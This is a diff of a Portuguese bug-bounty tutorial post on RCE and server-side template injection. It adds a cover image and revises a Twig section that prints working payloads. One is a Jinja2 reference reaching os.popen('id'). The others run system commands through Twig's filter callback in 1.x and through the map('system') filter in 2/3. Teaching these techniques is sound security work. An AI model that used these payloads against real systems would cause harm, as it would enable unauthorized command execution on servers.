@@ -5,6 +5,7 @@ author: matheus
 date: 2026-06-03 23:50:00 -0300
 categories: [Bug Bounty, Vulnerabilidades]
 tags: ["RCE", "command injection", "SSTI", "file upload", "insecure deserialization", "OWASP", "bug bounty", "web security", "Burp Suite"]
+image: /assets/img/covers/rce-command-injection-ssti.png
 pin: false
 comments: true
 ---
@@ -233,10 +234,10 @@ O detalhe **crucial**: `{{7*7}}` precisa virar **49**, não `7*7` (texto bruto, 
 
 `cycler.__init__.__globals__` te dá o namespace global do módulo onde `cycler` vive — e lá mora `os`. De `os.popen('id').read()` sai a saída do comando.
 
-**Twig (PHP)** — registra `system` como callback de filtro:
+**Twig (PHP)** — em **Twig 1.x** (legado/EOL) via callback de filtro; em **Twig 2/3** (o que se encontra hoje) via filtro `map`/`filter`:
 
 ```twig
-{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}
+{{_self.env.registerUndefinedFilterCallback("system")}}{{_self.env.getFilter("id")}}   # SÓ Twig 1.x (EOL): em 2/3, _self vira string e isto falha
 {{ ['id'] | map('system') | join }}     # alternativa via filtro map (Twig moderno); |join concatena a saída
 ```
 
